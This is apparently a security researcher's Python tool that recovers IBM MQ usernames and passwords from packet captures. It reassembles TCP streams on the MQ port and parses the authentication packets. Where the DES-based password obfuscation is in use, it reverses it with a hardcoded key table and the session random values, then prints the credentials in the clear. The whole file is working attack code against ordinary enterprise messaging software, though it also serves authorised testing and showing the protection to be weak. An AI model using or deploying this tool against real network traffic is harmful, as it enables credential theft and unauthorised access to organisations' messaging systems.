#!/usr/bin/env python3
"""mqpassword_recovery.py — recover IBM MQ credentials from a pcap capture."""

import argparse
import codecs
import sys
from collections import defaultdict

SCRIPT_VERSION = "0.1.0"
BANNER_TITLE = "IBM MQ Password Recovery Tool"
BANNER_CREDIT = "by Michał Majchrowicz AFINE Team"
BANNER_LINE = f"{BANNER_TITLE} v{SCRIPT_VERSION} {BANNER_CREDIT}"
DEFAULT_PORT = 1414
TSH_HEADER_SIZE = 28

RFP_TST_INITIAL_INFO = 1
RFP_TST_CONAUTH_INFO = 10
LOCAL_CCSID = 819

# ── DES tables (shared with mqlogin.py) ──────────────────────────────────────

YFX = bytes([
    0xDF, 0x09, 0x15, 0x84, 0x89, 0x7B, 0x7E, 0xD6,
    0xB7, 0x32, 0xC1, 0x17, 0xB5, 0xF8, 0xAB, 0xB8,
    0xD5, 0x41, 0xE3, 0x1B, 0xDB, 0x54, 0xAA, 0x62,
])
PC_1C = [57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36]
PC_1D = [62, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4]
PC_2C = [14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2]
PC_2D = [41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32]
SHIFTS = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]
E_TABLE = [32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25, 24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1]
P_TABLE = [16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25]
IP_TABLE = [58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7]
IP_INV_TABLE = [40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25]
S_BOXES = [
    [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]],
    [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]],
    [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]],
    [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]],
    [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]],
    [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]],
    [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]],
    [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]],
]


# ── DES implementation ────────────────────────────────────────────────────────

def _bytes_to_bits(byte_data: bytes) -> list[int]:
    bits = [0] * (len(byte_data) * 8)
    for i, curr_byte in enumerate(byte_data):
        for j in range(8):
            bits[i * 8 + j] = (curr_byte >> (7 - j)) & 1
    return bits


def _bits_to_bytes(bit_data: list[int]) -> bytes:
    out = bytearray(len(bit_data) // 8)
    for i in range(len(out)):
        j = i * 8
        out[i] = (
            (bit_data[j] << 7) | (bit_data[j + 1] << 6) | (bit_data[j + 2] << 5)
            | (bit_data[j + 3] << 4) | (bit_data[j + 4] << 3) | (bit_data[j + 5] << 2)
            | (bit_data[j + 6] << 1) | bit_data[j + 7]
        )
    return bytes(out)


def _key_schedule(key: bytes) -> list[list[int]]:
    bit_key = _bytes_to_bits(key)
    c = [bit_key[index - 1] for index in PC_1C]
    d = [bit_key[index - 1] for index in PC_1D]
    schedules: list[list[int]] = []
    for shift in SHIFTS:
        c = c[shift:] + c[:shift]
        d = d[shift:] + d[:shift]
        ks = [0] * 48
        for j in range(24):
            ks[j] = c[PC_2C[j] - 1]
            ks[j + 24] = d[PC_2D[j] - 29]
        schedules.append(ks)
    return schedules


def _des_f(right: list[int], key_bits: list[int]) -> list[int]:
    input_s = [right[index - 1] ^ key_bits[i] for i, index in enumerate(E_TABLE)]
    output_s = [0] * 32
    for i in range(8):
        j = i * 6
        row = input_s[j] * 2 + input_s[j + 5]
        col = input_s[j + 1] * 8 + input_s[j + 2] * 4 + input_s[j + 3] * 2 + input_s[j + 4]
        val = S_BOXES[i][row][col]
        k = i * 4
        output_s[k] = (val >> 3) & 1
        output_s[k + 1] = (val >> 2) & 1
        output_s[k + 2] = (val >> 1) & 1
        output_s[k + 3] = val & 1
    return [output_s[index - 1] for index in P_TABLE]


def _des_block(key: bytes, block: bytes, decrypt: bool) -> bytes:
    ks = _key_schedule(key)
    if decrypt:
        ks = ks[::-1]
    tmp = [_bytes_to_bits(block)[index - 1] for index in IP_TABLE]
    for round_index in range(16):
        left = tmp[:32]
        right = tmp[32:]
        f_out = _des_f(right, ks[round_index])
        if round_index < 15:
            tmp = right + [left[i] ^ f_out[i] for i in range(32)]
        else:
            tmp = [left[i] ^ f_out[i] for i in range(32)] + right
    output_bits = [tmp[index - 1] for index in IP_INV_TABLE]
    return _bits_to_bytes(output_bits)


def _derive_ppa_keys(r_state: bytes) -> list[bytes]:
    keys = []
    for base, r_part in ((0, r_state[0:8]), (8, r_state[8:16]), (16, r_state[16:24])):
        key = bytearray(8)
        for index in range(8):
            key[index] = YFX[base + index] ^ 0x08
            if index == 0:
                key[index] = (key[index] & 0xF0) | ((key[index] ^ r_part[index]) & 0x0F)
            else:
                key[index] ^= r_part[index]
        keys.append(bytes(key))
    return keys


def decrypt_ppa_password(ciphertext: bytes, r_state: bytes, orig_len: int) -> bytes:
    """Reverse the triple-DES ECB obfuscation applied by remote_ppa_finish_auth_flow."""
    keys = _derive_ppa_keys(r_state)
    working = bytearray(ciphertext)
    # Encryption applied k1→k2→k3 per block; decryption reverses: k3→k2→k1.
    for key in reversed(keys):
        for block in range(0, len(working), 8):
            working[block:block + 8] = _des_block(key, bytes(working[block:block + 8]), decrypt=True)
    return bytes(working[:orig_len])


# ── MQ codec helpers ──────────────────────────────────────────────────────────

def _mq_codec(ccsid: int) -> str:
    if ccsid == 819:
        return "iso-8859-1"
    try:
        codecs.lookup(f"cp{ccsid}")
    except LookupError:
        if ccsid == 870:
            return "cp500"
        return "iso-8859-1"
    return f"cp{ccsid}"


def _decode_mq(data: bytes, ccsid: int) -> str:
    return data.decode(_mq_codec(ccsid), errors="replace").strip("\x00").strip()


# ── MQ TSH packet splitting ───────────────────────────────────────────────────

_TSH_EYECATCHER_ASCII  = b"TSH "           # standard client / ASCII-mode server
_TSH_EYECATCHER_EBCDIC = b"\xe3\xe2\xc8\x40"  # z/OS / IBM MQ on EBCDIC systems


def split_tsh_packets(stream: bytes) -> list[bytes]:
    """Split a reassembled TCP byte stream into complete TSH frames.

    Accepts both ASCII and EBCDIC "TSH " eyecatchers so streams from
    z/OS / IBM MQ on mainframe are handled correctly.
    """
    packets = []
    offset = 0
    while offset + TSH_HEADER_SIZE <= len(stream):
        eye = stream[offset:offset + 4]
        if eye != _TSH_EYECATCHER_ASCII and eye != _TSH_EYECATCHER_EBCDIC:
            break
        length = int.from_bytes(stream[offset + 4:offset + 8], "big")
        if length < TSH_HEADER_SIZE or offset + length > len(stream):
            break
        packets.append(stream[offset:offset + length])
        offset += length
    return packets


# ── MQ protocol field parsers ─────────────────────────────────────────────────

def parse_client_id(packet: bytes) -> bytes | None:
    """Extract the 12-byte client R value from a client-sent INITIAL_INFO packet."""
    body = packet[TSH_HEADER_SIZE:]
    if len(body) < 240:
        return None
    return body[228:240]


def parse_server_id(packet: bytes) -> tuple[int | None, int | None, bytes, bool, int]:
    """Return (fap_level, ppa, server_r, swap, ccsid) from a server INITIAL_INFO reply."""
    if len(packet) < TSH_HEADER_SIZE + 8:
        return None, None, b"", False, LOCAL_CCSID
    base = TSH_HEADER_SIZE
    ccsid = int.from_bytes(packet[24:26], "big")
    fap_level = packet[base + 4]
    ppa = None
    if len(packet) >= base + 210:
        ppa = int.from_bytes(packet[base + 208:base + 210], "big")
    server_r = packet[base + 228:base + 240] if len(packet) >= base + 240 else b""
    swap = packet[8] == 2
    return fap_level, ppa, server_r, swap, ccsid


def parse_caut(packet: bytes, fap_level: int, swap: bool, ccsid: int) -> tuple[str | None, bytes, int, int]:
    """Return (username, password_bytes, padded_len, orig_len) from a CAUT packet.

    password_bytes is raw (possibly DES-encrypted); call decrypt_ppa_password
    when ppa == 1.

    padded_len is derived from the actual body size, not from offset 20.
    mqlogin.py keeps offset 20 as the original byte count even after DES padding;
    the payload simply grows and the TSH length field carries the true size.
    """
    body = packet[TSH_HEADER_SIZE:]
    if len(body) < 24 or body[0:4] != b"CAUT":
        return None, b"", 0, 0
    order = "little" if swap else "big"
    user_len = int.from_bytes(body[8:12], order)
    orig_pw_len = int.from_bytes(body[12:16], order)
    user_id_offset = 32 if fap_level > 16 else 24
    if len(body) < user_id_offset + user_len or user_len == 0:
        return None, b"", 0, 0
    # Padded (possibly encrypted) password occupies whatever bytes remain after
    # the header fields and the user bytes.
    padded_pw_len = len(body) - user_id_offset - user_len
    if padded_pw_len < 0:
        return None, b"", 0, 0
    username = _decode_mq(body[user_id_offset:user_id_offset + user_len], ccsid)
    pw_bytes = bytes(body[user_id_offset + user_len:user_id_offset + user_len + padded_pw_len])
    return username, pw_bytes, padded_pw_len, orig_pw_len


# ── TCP stream reassembly using scapy ─────────────────────────────────────────

def _load_scapy():
    try:
        from scapy.all import rdpcap
        from scapy.layers.inet import IP, TCP
        from scapy.packet import Raw
        return rdpcap, IP, TCP, Raw
    except ImportError:
        pass
    try:
        # Some scapy versions keep everything in scapy.all
        from scapy.all import rdpcap, IP, TCP, Raw  # type: ignore
        return rdpcap, IP, TCP, Raw
    except ImportError:
        raise SystemExit(
            "scapy is not installed. Install it with:\n  pip install scapy"
        )


def _reassemble_direction(segments: list[tuple[int, bytes]]) -> bytes:
    """Merge TCP segments into a contiguous byte stream.

    Uses byte-level fill so that a later segment that extends an earlier one
    (e.g. UID alone retransmitted as UID+CAUT) contributes its additional bytes
    rather than being discarded by a first-wins dedup.
    """
    if not segments:
        return b""
    segments = sorted(segments, key=lambda x: x[0])
    isn = segments[0][0]
    buf = bytearray()
    for seq, data in segments:
        if not data:
            continue
        offset = seq - isn
        if offset < 0:  # seq wraparound (extremely unlikely for short sessions)
            offset += 1 << 32
        end = offset + len(data)
        if end > len(buf):
            buf.extend(b"\x00" * (end - len(buf)))
        buf[offset:end] = data
    return bytes(buf)


def reassemble_streams(pcap_path: str, mq_port: int, debug: bool) -> list[dict]:
    """Return a list of dicts with keys client, server, c2s (bytes), s2c (bytes)."""
    rdpcap, IP, TCP, Raw = _load_scapy()

    try:
        packets = rdpcap(pcap_path)
    except Exception as exc:
        raise SystemExit(f"Cannot read pcap file: {exc}") from exc

    # streams[stream_key][endpoint] = [(seq, data), ...] — all segments, no dedup
    raw_streams: dict = defaultdict(lambda: defaultdict(list))

    for pkt in packets:
        if IP not in pkt or TCP not in pkt or Raw not in pkt:
            continue
        src = (pkt[IP].src, pkt[TCP].sport)
        dst = (pkt[IP].dst, pkt[TCP].dport)
        stream_key = tuple(sorted([src, dst]))
        raw_streams[stream_key][src].append((pkt[TCP].seq, bytes(pkt[Raw])))

    result = []
    for stream_key, endpoints in raw_streams.items():
        server_ep = next((ep for ep in endpoints if ep[1] == mq_port), None)
        if server_ep is None:
            continue
        client_ep = next((ep for ep in endpoints if ep != server_ep), None)
        if client_ep is None:
            continue

        c2s = _reassemble_direction(endpoints[client_ep])
        s2c = _reassemble_direction(endpoints[server_ep])

        if debug:
            print(
                f"[debug] stream {client_ep[0]}:{client_ep[1]} → "
                f"{server_ep[0]}:{server_ep[1]}  "
                f"c2s={len(c2s)}B s2c={len(s2c)}B",
                file=sys.stderr,
            )

        result.append({"client": client_ep, "server": server_ep, "c2s": c2s, "s2c": s2c})

    return result


# ── Per-stream credential recovery ───────────────────────────────────────────

_PPA_DESC = {0: "none (plaintext)", 1: "DES-based obfuscation"}


def recover_stream(stream: dict, debug: bool) -> list[dict]:
    c2s_pkts = split_tsh_packets(stream["c2s"])
    s2c_pkts = split_tsh_packets(stream["s2c"])

    if debug:
        print(f"[debug] c2s TSH packets: {len(c2s_pkts)}  s2c TSH packets: {len(s2c_pkts)}", file=sys.stderr)
        s2c = stream["s2c"]
        print(
            f"[debug] s2c bytes={len(s2c)}  first16={s2c[:16].hex() if s2c else '(empty)'}",
            file=sys.stderr,
        )
        for i, pkt in enumerate(c2s_pkts):
            print(f"[debug] c2s[{i}] seg={pkt[9]} len={len(pkt)}", file=sys.stderr)

    # Pull negotiation state from the exchange.
    client_r: bytes | None = None
    server_r: bytes = b""
    fap_level: int = 17  # DEFAULT_FAP matches mqlogin.py's RFP_FAP_LEVEL
    ppa: int | None = None
    swap = False
    ccsid = LOCAL_CCSID

    for pkt in c2s_pkts:
        if pkt[9] == RFP_TST_INITIAL_INFO:
            client_r = parse_client_id(pkt)
            if debug:
                print(f"[debug] client_r: {client_r.hex() if client_r else None}", file=sys.stderr)
            break

    for pkt in s2c_pkts:
        if pkt[9] == RFP_TST_INITIAL_INFO:
            fap_level, ppa, server_r, swap, ccsid = parse_server_id(pkt)
            if debug:
                print(
                    f"[debug] server ID: fap={fap_level} ppa={ppa} "
                    f"swap={swap} ccsid={ccsid} server_r={server_r.hex() if server_r else None}",
                    file=sys.stderr,
                )
            break

    results = []
    for pkt in c2s_pkts:
        if pkt[9] != RFP_TST_CONAUTH_INFO:
            continue
        if debug:
            body = pkt[TSH_HEADER_SIZE:]
            order = "little" if swap else "big"
            user_len_raw = int.from_bytes(body[8:12], order) if len(body) >= 12 else -1
            orig_pw_raw = int.from_bytes(body[12:16], order) if len(body) >= 16 else -1
            user_id_offset = 32 if fap_level > 16 else 24
            print(
                f"[debug] CAUT raw: body={len(body)}B eyecatcher={body[:4]} "
                f"user_len={user_len_raw} orig_pw_len={orig_pw_raw} "
                f"user_id_offset={user_id_offset} fap={fap_level} swap={swap}",
                file=sys.stderr,
            )
        username, pw_bytes, padded_len, orig_len = parse_caut(pkt, fap_level, swap, ccsid)
        if username is None:
            if debug:
                print("[debug] CAUT: parse_caut returned None — skipping", file=sys.stderr)
            continue

        if debug:
            print(
                f"[debug] CAUT username: {username!r}  "
                f"ccsid={ccsid} user_bytes={pw_bytes and len(username.encode(_mq_codec(ccsid), errors='replace'))}",
                file=sys.stderr,
            )

        if ppa == 1:
            if client_r and len(client_r) == 12 and len(server_r) == 12:
                r_state = client_r + server_r
                pw_raw = decrypt_ppa_password(pw_bytes, r_state, orig_len)
                password = pw_raw.decode(_mq_codec(ccsid), errors="replace")
                if debug:
                    print(
                        f"[debug] CAUT password: decrypted {padded_len}B → {orig_len}B plaintext",
                        file=sys.stderr,
                    )
            else:
                password = "<cannot decrypt: R values missing or incomplete>"
                if debug:
                    print(
                        f"[debug] CAUT password: cannot decrypt — "
                        f"client_r={'ok' if client_r and len(client_r)==12 else 'missing'} "
                        f"server_r={'ok' if len(server_r)==12 else 'missing'}",
                        file=sys.stderr,
                    )
        elif ppa == 0 or ppa is None:
            password = pw_bytes[:orig_len].decode(_mq_codec(ccsid), errors="replace") if orig_len else pw_bytes.decode(_mq_codec(ccsid), errors="replace")
            if debug:
                print(f"[debug] CAUT password: plaintext {orig_len}B", file=sys.stderr)
        else:
            password = f"<unsupported PPA algorithm {ppa}>"
            if debug:
                print(f"[debug] CAUT password: unsupported ppa={ppa}", file=sys.stderr)

        results.append({
            "username": username,
            "password": password,
            "ppa": ppa,
            "fap_level": fap_level,
        })

    return results


# ── CLI ───────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Recover IBM MQ credentials from a pcap containing an mqlogin.py capture."
    )
    parser.add_argument("pcap", help="Path to the pcap file")
    parser.add_argument(
        "--port", "-p",
        type=int,
        default=DEFAULT_PORT,
        help=f"MQ listener port to look for (default: {DEFAULT_PORT})",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Print protocol parsing details to stderr",
    )
    return parser


def main() -> int:
    parser = build_parser()
    if len(sys.argv) == 1:
        parser.print_help()
        return 0

    args = parser.parse_args()

    print(f"\n{BANNER_LINE}\n")

    streams = reassemble_streams(args.pcap, args.port, args.debug)
    if not streams:
        print(f"[!] No MQ streams found on port {args.port} in {args.pcap}")
        return 1

    total = 0
    for stream in streams:
        c = stream["client"]
        s = stream["server"]
        print(f"[+] Stream: {c[0]}:{c[1]} → {s[0]}:{s[1]}")
        results = recover_stream(stream, args.debug)
        if not results:
            print("    no credentials recovered from this stream")
        for r in results:
            ppa_label = _PPA_DESC.get(r["ppa"], f"unknown ({r['ppa']})")
            print(f"    username:            {r['username']}")
            print(f"    password:            {r['password']}")
            print(f"    password protection: {ppa_label}")
            print(f"    fap level:           {r['fap_level']}")
            total += 1
        print()

    print(f"[+] Recovered {total} credential pair(s) from {len(streams)} stream(s)")
    return 0 if total > 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
